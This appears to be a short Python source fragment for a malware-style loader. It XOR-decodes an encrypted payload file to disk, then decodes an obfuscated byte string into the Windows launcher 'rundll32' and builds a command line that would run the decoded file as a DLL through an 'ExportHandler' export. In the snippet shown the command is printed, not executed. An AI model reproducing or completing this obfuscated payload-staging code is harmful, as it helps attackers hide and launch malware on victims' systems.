import subprocess

def load(source, target, key, command_key):
    command = b"\xae\xa9\xb2\xb8\xb0\xb0\xef\xee"
    with open(source, "rb") as f1, open(target, "wb") as f2:
        while True:
            byte = f1.read(1)
            if not byte:
                break
            decoded = ord(byte) ^ key
            f2.write(bytes([decoded]))
    runner = bytes([x ^ command_key for x in command]).decode()
    line = f'{runner} "{target}", ExportHandler argument'
    print(line)
